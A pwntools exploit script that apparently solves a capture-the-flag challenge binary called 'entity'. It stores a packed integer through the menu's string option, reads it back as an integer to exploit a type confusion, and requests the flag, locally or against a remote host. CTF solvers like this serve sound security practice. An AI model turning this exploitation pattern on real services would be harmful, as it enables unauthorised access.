from pwn import *
import sys

BINARY = "entity"
context.binary = exe = ELF(f"./{BINARY}", checksec=False)
context.terminal = "konsole -e".split()
context.log_level = "INFO"
context.bits = 64
context.arch = "amd64"


def init():
    if args.RMT:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process()
    return Exploit(p), p


class Exploit:
    def __init__(self, p: process):
        self.p = p

    def debug(self, script=None):
        if not args.RMT:
            if script:
                attach(self.p, script)
            else:
                attach(self.p)

    def send(self, content):
        p = self.p
        p.sendlineafter(b"foooo....", content)

    def STORE_SET(self, this_type, content):
        p = self.p
        p.sendlineafter(b">> ", b"T")
        getattr(self, this_type)(content)

    def STORE_GET(self, this_type):
        p = self.p
        p.sendlineafter(b">> ", b"R")
        getattr(self, this_type)()

    def FLAG(self):
        p = self.p
        p.sendlineafter(b">> ", b"C")

    def INTEGER(self, content: str = None):
        p = self.p
        p.sendlineafter(b">> ", b"L")
        if content:
            p.sendlineafter(b">> ", content)

    def STRING(self, content: str = None):
        p = self.p
        p.sendlineafter(b">> ", b"S")
        if content:
            p.sendlineafter(b">> ", content)


INTEGER = Exploit.INTEGER.__name__
STRING = Exploit.STRING.__name__

x, p = init()

x.STORE_SET(STRING, flat(13371337))
x.STORE_GET(INTEGER)
x.FLAG()

p.interactive()
